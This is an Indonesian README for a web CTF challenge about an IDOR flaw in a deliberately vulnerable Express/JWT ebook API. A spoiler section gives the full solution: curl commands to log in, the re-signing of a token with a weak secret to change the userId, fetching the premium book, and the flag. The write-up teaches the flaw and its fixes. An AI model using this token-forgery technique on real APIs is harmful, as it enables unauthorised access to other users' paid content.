# API eBook Premium - Akses Buku Berbayar via IDOR

> Web CTF Challenge | by [ctflabs-id](https://github.com/ctflabs-id)


---

## 📖 Scenario

Anda adalah pentester yang ditugaskan mengaudit API layanan eBook premium. Sistem ini menggunakan Express.js dengan autentikasi JWT. Meskipun memerlukan login, terdapat kerentanan dimana user bisa mengakses eBook berbayar milik user lain dengan memodifikasi claim JWT.

---

## 🎯 Challenge Overview
**Target:** `http://api-ebook-premium.local:4000`<br>
**Vulnerability:** Insecure Direct Object Reference (IDOR) via JWT Claim Manipulation<br>
**Objective:** Dapatkan akses ke eBook premium dengan ID 1337 dan ekstrak flag dari kontennya.<br>
**Difficulty:** ⭐⭐⭐☆☆ (Intermediate)

---
## 🛠️ Setup Instructions

Prerequisites:

    Node.js v16+
    MongoDB
    JWT tool (optional)

Langkah-langkah:

  1. Clone repository ini
```bash
git clone https://github.com/ctflabs-id/API-eBook-Premium.git
cd API-eBook-Premium
```
  2. Install dependencies
```bash
npm install express jsonwebtoken mongoose body-parser
```
  3. Pastikan MongoDB Berjalan
  4. Start Server
```bash
node index.js
```
  5. Server akan berjalan di http://localhost:4000

---

## 💡 Hints
    🔑 Dapatkan token JWT valid terlebih dahulu via endpoint /login
    🔍 Gunakan tools seperti jwt.io untuk inspeksi/decode token
    ✏️ Modifikasi claim userId pada JWT untuk mendapatkan akses ke eBook premium
    📌 eBook target memiliki ID 1337
    🚩 Flag ada dalam content eBook premium

---

## 🎓 Tujuan Tantangan Ini
  1. Memahami kerentanan IDOR pada sistem berbasis JWT
  2. Belajar teknik manipulasi claim JWT
  3. Memahami pentingnya validasi kepemilikan resource di server
  4. Praktik eksploitasi authorization flaw pada REST API

---

## ⚠️ Disclaimer

Challenge ini dibuat hanya untuk edukasi dan simulasi keamanan siber. Jangan gunakan teknik serupa terhadap sistem yang tidak kamu miliki atau tidak diizinkan.

---
<details><summary><h2>🏆 Solusi yang Diharapkan - (Spoiler Allert)</h2></summary>

Peserta harus:
    1. Dapatkan Token JWT Awal<br>
    ```bash
    curl -X POST http://localhost:4000/login \
  -H "Content-Type: application/json" \
  -d '{"username":"user","password":"password123"}'
    ```
    Contoh Response:
    ```json
    {
  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjEwMDEsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNzE5NDI5NDAwLCJleHAiOjE3MTk0MzMwMDB9.4j5XW7zQl2HJYwLw7QXn2v8m6d9QkZcX6jK7vL1J3Ek"
}
    ```
    2. Langkah 2: Decode Token di jwt.io
      1. Buka https://jwt.io atau https://10015.io/tools/jwt-encoder-decoder
      2. Paste token yang didapat:
      ```
      eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjEwMDEsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNzE5NDI5NDAwLCJleHAiOjE3MTk0MzMwMDB9.4j5XW7zQl2HJYwLw7QXn2v8m6d9QkZcX6jK7vL1J3Ek
      ```
      3. Lihat payload:
      ```json
      {
  "userId": 1001,
  "role": "user",
  "iat": 1719429400,
  "exp": 1719433000
}
      ```
   3. Ubah userId dari 1001 menjadi 9999 (pemilik eBook premium)
      1. Ubah userId dari 1001 menjadi 9999 (pemilik eBook premium)
      2. Gunakan secret key insecure_secret_123 untuk signature baru
      3. Hasilkan token baru, contoh
      ```
      eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjk5OTksInJvbGUiOiJ1c2VyIiwiaWF0IjoxNzUwODU5MTM5LCJleHAiOjE3NTA4NjI3Mzl9.Y9OyLkfj5kBkgqqthRIcEU-LS1WR3f_EoUXk9qe3H1E
      ```
    4. Akses eBook Premium
    Gunakan token yang sudah dimodifikasi:
    ```bash
    curl http://localhost:4000/api/ebooks/1337 \
  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjk5OTksInJvbGUiOiJ1c2VyIiwiaWF0IjoxNzE5NDI5NDAwLCJleHAiOjE3MTk0MzMwMDB9.1qZ3vVJkXoQ2wY8hN7Rt6cTm1x9fKsLp5UqSdW0bO4Y"
    ```
    Response Sukses:
    ```bash
    {
  "title": "eBook Premium",
  "content": "CTF_FLAG{JWT_IDOR_Pr3v3nt1on_1s_Key}",
  "price": 50000
}
    ```
Penjelasan Kerentanan

    IDOR: Endpoint tidak memverifikasi kepemilikan resource
    JWT Abuse: Server hanya memverifikasi signature, tidak memeriksa konsistensi data
    Solusi Pengamanan:
        Verifikasi ownership resource di server
        Gunakan UUID bukan sequential ID
        Implementasi role-based access control
        
</details>

---

## 🤝 Kontribusi Pull request & issue welcome via: ctflabs-id/Perpustakaan-Hantu-CTF
## 🧠 Maintained by:
```
GitHub: @ctflabs-id
Website: ctflabsid.my.id
```



